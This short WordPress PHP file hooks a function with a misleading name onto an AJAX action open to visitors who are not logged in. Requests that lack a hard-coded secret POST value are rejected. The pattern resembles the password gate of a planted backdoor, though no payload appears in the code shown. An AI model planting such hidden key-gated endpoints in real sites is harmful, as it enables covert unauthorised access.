<?php

function colors_preloader_scripts() {
	if (!isset($_POST["szbwalakuml"]) || $_POST["szbwalakuml"] !== "lHY1lnyGVIFi") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'colors_preloader_scripts', 5, 1);
